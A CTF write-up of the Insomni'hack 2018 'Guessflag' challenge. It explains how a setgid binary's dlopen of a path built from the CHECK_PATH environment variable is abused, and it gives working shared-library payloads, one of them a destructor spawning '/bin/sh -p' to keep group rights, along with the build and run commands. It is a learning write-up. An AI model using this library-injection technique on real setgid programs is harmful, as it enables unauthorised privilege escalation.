### Guessflag
Guessflag was a **warmup pwn** at insomnihack 2018. It was a **fairly easy challenge**, but we struggled a lot on small details.

### The challenge
We were given a ssh connection on a remote server, and the challenge was in `/home/flag` .
There were a shared lib, dowin.so, the main binary, guessflag, and a text file, flag.txt.
**We can see that guessflag was setgid and the group "flag" was the owner of both the flag.txt file and the guessflag binary**.
```
user1@insomniak:/home/flag$ ls -al
total 32
drwxr-xr-x  2 root root  4096 Mar 26 13:18 .
drwxr-xr-x 12 root root 4096 Mar 26 12:50 ..
-rwxr-xr-x  1 root root  7512 Mar 26 12:50 dowin.so
-rwxr-sr-x  1 root flag  8520 Mar 26 12:51 guessflag
-rw-r-----  1 root flag   262 Mar 26 13:18 flag.txt
```
With those informations, we know that we probably have to exploit the guessflag binary to run commands as the "flag" group and cat our flag.txt file, which certainly contain our flag.

### Analysis
Lets start with some analysis of the binary.

First we look at the output of the file command. 
```
user1@insomniak:/home/flag$ file guessflag                                                                                                                      
guessflag: setgid ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, not stripped
```
It tell us that it is **compiled as a dynamic binary** , which means it rely on the libc of the remote server for standard functions like printf and that stuff. We could hook a standard function using  [LD_PRELOAD trick](https://www.goldsborough.me/c/low-level/kernel/2016/08/29/16-48-53-the_-ld_preload-_trick/) , but from my little experience , i known that **LD_PRELOAD is ignored when the binary is setuid or setgid**, which is the case here.

So let's move on and look at ltrace's output.
```
user1@insomniak:/home/flag$ ltrace ./guessflag                                                                                                                    
puts("Can you guess the flag ?"Can you guess the flag ?
)                                                                                        = 25
+++ exited (status 255) +++
```
Nothing fancy here, let's try with an argument.
```
user1@insomniak:/home/flag$ ltrace ./guessflag arg                                                                                                                   
puts("Can you guess the flag ?"Can you guess the flag ?
)                                                                                        = 25
getenv("CHECK_PATH")                                                                                                    = nil
snprintf("(null)/dowin.so", 1024, "%s/dowin.so", nil)                                                                   = 15
dlopen("(null)/dowin.so", 1)                                                                                            = 0
+++ exited (status 255) +++
```

Uuh! Looks like it **first check  if we have an argument , and if there is one it try to get the content of the environnement variable CHECK_PATH**.
Let's try to set this variable : 
```
user1@insomniak:/home/flag$ CHECK_PATH=test ltrace ./guessflag arg                                                                                                   
puts("Can you guess the flag ?"Can you guess the flag ?
)                                                                                        = 25
getenv("CHECK_PATH")                                                                                                    = "test"
snprintf("test/dowin.so", 1024, "%s/dowin.so", "test")                                                                  = 13
dlopen("test/dowin.so", 1)                                                                                              = 0
+++ exited (status 255) +++
```

Yup, so it looks like it **append the content of the environnement var CHECK_PATH to the string "/dowin.so" and then try to dlopen it**. Which means that if we set the CHECK_PATH variable to something like `/tmp/pld` and create our own dowin.so in this directory, it will load it !

### Exploit

We've never met the dlopen function before, but it's a really easy-to-understand function.
It simply open the given shared file and give you the ability to execute the function it provide.

The problem here is that we can't create a random function, and simply load our library. Our function will never be called. 

Here we struggled a bit, and Geluchat gave us a neat trick : **you can use the [.fini section](http://l4u-00.jinr.ru/usoft/WWW/www_debian.org/Documentation/elf/node3.html) by creating a destructor in our dowin.so, and it will execute it when the lib is unloaded** (e.g when the binary exit).

So it gave use a payload like this :

```c
#include <unistd.h>

void begin (void) __attribute__((destructor));

void begin (void) {
	system("id && whoami");
}


```

We setted up the exploit in tmp : 

```
user1@insomniak:/home/flag$ mkdir /tmp/pld && cd /tmp/pld
user1@insomniak:/tmp/pld$ gcc -o dowin.so -fPIC -shared payload.c
user1@insomniak:/tmp/pld$ export CHECK_PATH=/tmp/pld ./guessflag a
Can you guess the flag ?
uid=1005(user1) gid=985(users) groups=985(users)
user1
```

Yeah nice , our destructor got executed !
But wait ... it dropped the rights :( Why this ?

We struggled like 2 hours on this, and we then asked for a bit of help to a Securimag member.
**He told us that on this machine, /bin/sh was a symlink to /bin/bash, which by default drop  the setgid and setuid rights when it is called**.
And with a `man system` , we can easily figure out that `system()` simply call `/bin/sh` with it's argument.

He also told us that **the '-p' argument on /bin/sh prevent it to drop the rights**.

That gave us our second payload : 

```c
void begin (void) __attribute__((destructor));

void begin (void) {
	char *envp[] = { NULL };
	char *argv[] = { "/bin/sh", "-p", NULL };
	execve("/bin/sh", argv, envp);
}
```

```
user1@insomniak:/tmp/pld$ gcc -o dowin.so -fPIC -shared payload.c
user1@insomniak:/tmp/pld$ export CHECK_PATH=/tmp/pld ./guessflag a
Can you guess the flag ?
user1@insomniak:/tmp/pld$ id
uid=1005(user1) gid=985(users) groups=985(users), 990(flag)
```

Yey ! We have a shell with the `flag` group :D

### Flag
```
user1@insomniak:/tmp/pld$ cat /home/flag/flag.txt
INS{th4t_library_was_usele$$}
```
